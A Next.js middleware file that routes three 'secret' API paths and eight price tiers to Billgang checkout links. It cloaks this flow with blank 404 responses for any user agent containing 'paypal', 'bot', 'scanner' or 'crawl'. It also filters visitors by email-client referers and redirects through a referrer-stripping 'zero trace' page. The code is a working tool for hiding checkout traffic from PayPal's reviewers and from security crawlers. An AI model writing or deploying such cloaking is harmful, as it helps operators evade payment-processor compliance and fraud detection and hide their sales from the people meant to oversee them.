import { NextResponse, userAgent } from "next/server";
import type { NextRequest } from "next/server";

/**
 * 24 Billgang checkout destinations — 8 tiers × 3 secret routes.
 * Replace each URL with your real Billgang links before deploying.
 */
const TIER_DESTINATIONS: Record<
  "pay-a" | "pay-b" | "pay-c",
  Record<"1" | "2" | "3" | "4" | "5" | "6" | "7" | "8", string>
> = {
  "pay-a": {
    "1": "https://billgang.com/checkout/pay-a-tier-1",
    "2": "https://billgang.com/checkout/pay-a-tier-2",
    "3": "https://billgang.com/checkout/pay-a-tier-3",
    "4": "https://billgang.com/checkout/pay-a-tier-4",
    "5": "https://billgang.com/checkout/pay-a-tier-5",
    "6": "https://billgang.com/checkout/pay-a-tier-6",
    "7": "https://billgang.com/checkout/pay-a-tier-7",
    "8": "https://billgang.com/checkout/pay-a-tier-8",
  },
  "pay-b": {
    "1": "https://billgang.com/checkout/pay-b-tier-1",
    "2": "https://billgang.com/checkout/pay-b-tier-2",
    "3": "https://billgang.com/checkout/pay-b-tier-3",
    "4": "https://billgang.com/checkout/pay-b-tier-4",
    "5": "https://billgang.com/checkout/pay-b-tier-5",
    "6": "https://billgang.com/checkout/pay-b-tier-6",
    "7": "https://billgang.com/checkout/pay-b-tier-7",
    "8": "https://billgang.com/checkout/pay-b-tier-8",
  },
  "pay-c": {
    "1": "https://billgang.com/checkout/pay-c-tier-1",
    "2": "https://billgang.com/checkout/pay-c-tier-2",
    "3": "https://billgang.com/checkout/pay-c-tier-3",
    "4": "https://billgang.com/checkout/pay-c-tier-4",
    "5": "https://billgang.com/checkout/pay-c-tier-5",
    "6": "https://billgang.com/checkout/pay-c-tier-6",
    "7": "https://billgang.com/checkout/pay-c-tier-7",
    "8": "https://billgang.com/checkout/pay-c-tier-8",
  },
};

const SECRET_ROUTES = new Set(["/api/pay-a", "/api/pay-b", "/api/pay-c"]);

const BOT_UA_FRAGMENTS = [
  "paypal",
  "bot",
  "spider",
  "scanner",
  "headless",
  "crawl"
    ,
] as const;

// Add "google.com" to the list to catch PC browser redirects
const ALLOWED_REFERER_FRAGMENTS = ["mail.google", "outlook", "google.com"] as const;

function ghost404(): NextResponse {
  return new NextResponse(null, { status: 404 });
}

function isBotUserAgent(userAgent: string): boolean {
  const ua = userAgent.toLowerCase();
  return BOT_UA_FRAGMENTS.some((fragment) => ua.includes(fragment));
}

function hasAllowedReferer(referer: string | null): boolean {
  if (!referer) return false;
  const ref = referer.toLowerCase();
  return ALLOWED_REFERER_FRAGMENTS.some((fragment) => ref.includes(fragment));
}

function buildZeroTraceHtml(destination: string): string {
  const safeUrl = JSON.stringify(destination);
  return `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="referrer" content="no-referrer"><script>window.location.replace(${safeUrl});</script></head><body></body></html>`;
}

export function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;

  if (!SECRET_ROUTES.has(pathname)) {
    return ghost404();
  }

  const routeKey = pathname.replace("/api/", "") as keyof typeof TIER_DESTINATIONS;

  const ua = request.headers.get("user-agent") ?? "";
  if (isBotUserAgent(ua)) {
    return ghost404();
  }

  const { device } = userAgent(request);
  const isMobileOrTablet = device?.type === "mobile" || device?.type === "tablet";
  if (!isMobileOrTablet) {
    const referer = request.headers.get("referer");
  
    // LOGIC: If there is NO referer at all on Desktop, it's suspicious, 
    // but some PC browsers strip it. We will allow it ONLY if the 
    // User-Agent looks like a real browser (Chrome/Firefox/Edge/Safari) 
    // and NOT a bot.
    const isRealBrowser = ua.includes("Mozilla") && !isBotUserAgent(ua);
  
    if (!hasAllowedReferer(referer) && !isRealBrowser) {
      return ghost404();
    }
  }

  const tier = request.nextUrl.searchParams.get("tier");
  if (!tier) {
    return ghost404();
  }

  const destinations = TIER_DESTINATIONS[routeKey];
  const destination = destinations?.[tier as keyof typeof destinations];
  if (!destination) {
    return ghost404();
  }

  return new NextResponse(buildZeroTraceHtml(destination), {
    status: 200,
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "Referrer-Policy": "no-referrer",
      "Cache-Control": "no-store, no-cache, must-revalidate",
    },
  });
}

export const config = {
  matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"],
};
